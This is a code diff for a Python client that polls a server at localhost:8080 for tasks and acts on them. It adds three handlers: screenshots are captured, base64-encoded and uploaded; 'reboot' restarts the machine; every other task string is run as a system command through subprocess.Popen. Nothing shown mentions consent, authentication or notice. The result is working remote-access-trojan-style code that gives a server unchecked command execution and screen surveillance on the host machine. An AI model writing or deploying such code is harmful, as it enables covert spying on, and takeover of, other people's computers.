@@ -6,6 +6,10 @@ import time as tm
 import calendar
 import datetime
 import json
+import subprocess
+import pyautogui
+import base64
+
 
 
 URL = "http://localhost:8080/"
@@ -68,14 +72,26 @@ def checkInputCommands(c):
     for i in range(len(tasks)):
         task = tasks[i]
         print("[НОВАЯ КОМАНДА] ~ " + task.command)
-        
-        #execute command
-        '''
-        if task.command == "photo":
-        elif task.command == "reboot":
-        else:
-            #subprocess call to CMD
-        '''
+        try:
+            if task.command == "photo":
+                myScreenshot = pyautogui.screenshot()
+                myScreenshot.save('screen.png')
+                with open("screen.png", "rb") as img_file:
+                    b64_string = base64.b64encode(img_file.read())
+                    
+                    responce = requests.post(URL + "clients/image/", json = {
+                        "img": str(b64_string),
+                        "clients_id": {
+                            "key": c.key,
+                        },
+                    }).text
+            elif task.command == "reboot":
+                subprocess.Popen("shutdown /r")
+            else:        
+                subprocess.Popen(task.command)
+        except Exception as err:
+            print(err)    
+            
 
         responce = requests.put(URL + "tasks/changeStatus/", json = {
             "id": task.id,
@@ -104,6 +120,6 @@ if __name__ == "__main__":
     while True:    
         getParam(c)
         checkInputCommands(c)
-        tm.sleep(5)
+        tm.sleep(4.9)
 
         
